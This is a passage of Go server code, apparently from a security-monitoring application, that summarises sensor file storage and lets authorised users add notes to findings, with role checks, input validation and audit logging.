				info, err := fe.Info()
				if err != nil {
					continue
				}
				node.Files++
				node.SizeBytes += info.Size()
				if mt := info.ModTime().Unix(); mt > node.NewestMtime {
					node.NewestMtime = mt
				}
			}
			if node.Files == 0 {
				continue
			}
			sensor.Dates = append(sensor.Dates, node)
			sensor.TotalFiles += node.Files
			sensor.TotalSizeBytes += node.SizeBytes
		}
		sort.Slice(sensor.Dates, func(i, j int) bool {
			return sensor.Dates[i].Date > sensor.Dates[j].Date
		})
		out.Sensors = append(out.Sensors, sensor)
	}
	sort.Slice(out.Sensors, func(i, j int) bool {
		return out.Sensors[i].Name < out.Sensors[j].Name
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func (s *Server) handleAddNote(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if u := userFromCtx(r); u.Role == model.RoleViewer {
		http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
		return
	}
	path := strings.TrimPrefix(r.URL.Path, "/api/findings/")
	path = strings.TrimSuffix(path, "/notes")
	id, err := strconv.Atoi(path)
	if err != nil {
		jsonError(w, "invalid id", http.StatusBadRequest)
		return
	}
	var req struct {
		Text string `json:"text"`
	}
	if err := decodeJSONBody(w, r, &req, noteBodyMaxBytes); err != nil {
		return
	}
	if strings.TrimSpace(req.Text) == "" {
		jsonError(w, "note text required", http.StatusBadRequest)
		return
	}
	user := userFromCtx(r)
	ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	noteText := strings.TrimSpace(req.Text)
	ok := s.store.AddNote(id, model.Note{
		Text:        noteText,
		Author:      user.DisplayName(),
		AuthorEmail: user.Email,
		Timestamp:   ts,
	})
	if !ok {
		http.NotFound(w, r)
		return
	}
	// Note text itself stays out of the audit log — it's preserved
	// in the finding's notes array, and may contain operationally
	// sensitive analyst observations. v0.14.1 NEW-32.
	f, _ := s.store.GetFinding(id)
	s.recordAudit(r, "finding_note_add", auditEvent{
		TargetType: "finding",
		TargetID:   strconv.Itoa(id),
		TargetName: findingAuditName(f),
		Details:    map[string]any{"note_length": len(noteText)},
	})
	jsonOK(w)
}

// ── Helpers ──────────────────────────────────────────────────────────────────

func severityOrder(sev model.Severity) int {
	switch sev {
	case model.SevCritical:
		return 4
	case model.SevHigh:
		return 3
	case model.SevMedium:
		return 2
	case model.SevLow:
		return 1
	}
	return 0
}

func jsonOK(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"ok":true}`))
}

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg})
}
